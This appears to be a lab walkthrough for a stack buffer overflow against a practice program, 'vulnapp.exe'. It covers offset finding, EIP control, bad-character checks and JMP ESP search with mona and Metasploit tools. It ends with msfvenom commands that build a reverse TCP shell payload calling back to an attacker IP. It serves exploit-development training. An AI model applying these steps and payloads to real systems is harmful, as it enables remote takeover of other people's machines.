# Buffer Overflow methodology

Steps to be followed for the machine solution;

Note: If after each debug operation performed, the application has become unresponsive; Immunity Debugger should be closed first, then the "vulnapp.exe" application should be restarted, and Attach and Run should be done on Immunity Debugger.

## 1. Segmentation fault : 1_segfault.py

Send enough length string for victim system crash

Note the offeset in ``PARAMETERS.py``, in the variable ``offset_eip``.
   
## 2. Find the offset : 2_find_offset.py:

Generate the pattern (adapt the buffer lenght) :

        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <String_Length>

        buf += ("<PATTERN>")

Put the output into the variable ``buf`` in ``2_find_offset.py`` & send it.

Once the app crashes, note down the value of the EIP register (which is the address of the next operation to be executed).




If needed : convert the EIP value to ASCII : echo "<EIP_value>" | xxd -r -p

Find the offset at which the sequence is met in the pattern :

        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>

Or, type this in Immunity Debugger : `!mona findmsp`.

Note the value of the EIP offet in the variable ``offset_eip`` in ``PARAMETERS.py``, and the value of the ESP offset in the variable ``offset_esp``.

## 3. Control the EIP : 3_confirm_offset.py

Execute this script as is.

In Immunity Debugger, make sure that
   - **BBBB** in the EIP (in hex, so ``42424242``)
   - **CCCCDDDDD.....** is written in what ESP points to

## 4. Find the bad chars : 4_find_badchars.py

Send it to the application

In Immunity Debugger, make mona create a list of badchars : 
        !mona bytearray –cpb “\x00”

Compare this file with the stack contents :
        !mona compare -a ESP -f <file_with_bad_chars>
        !mona compare -a <WHATEVER ADDRESS> -f <file_with_bad_chars>

In the mona output, ``Possibly bad chars`` are output.
Put them in the ``badchars`` array in ``PARAMETERS.py``.

## 5. Confirm badchars & find a JMP ESP instruction : 5_find_jmp_esp.py

### a. Confirm badchars

Make sure the badchars identified are mentionned in the ``PARAMETERS.py`` file.

Execute the script.

Re-generate a badchar sequence on mona : 

        !mona bytearray -cpb "\x00\x04\x05\xA2\xA3\xAC\xAD\xC0\xC1\xEF\xF0"

Compare the bytearray and the buffer to make sure they are the same.
That will mean that no new badchar have been detected :

        !mona compare -a ESP -f <file_with_bad_chars>
        !mona compare -a <WHATEVER ADDRESS> -f <file_with_bad_chars>


### b. Find a JMP ESP

        !mona jmp -r esp -cpb "<bad_chars>" formatted like this : "\x00\x01"

Put the address returned in the variable ``ptr_jmp_esp`` in ``PARAMETERS.py``

Launch the script

Check that \xCC values are well in what ESP points to


## 6. Pop calc : 6_pop_calc.py

We will also move ESP up in the stack ("SUB ESP,0x10)
This is to avoid the ESP overwrite by the encoder

        msfvenom -p windows/exec -b '<badchars>' -f python --var-name shellcode_calc \
        CMD=calc.exe EXITFUNC=thread

## 7. Create shellcode : 7_exploit.py

        msfvenom -p windows/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_Port> \
        -f py -b '<badchars>' -e x86/shikata_ga_nai -var-name shellcode

   Insert it in the 7_exploit.py




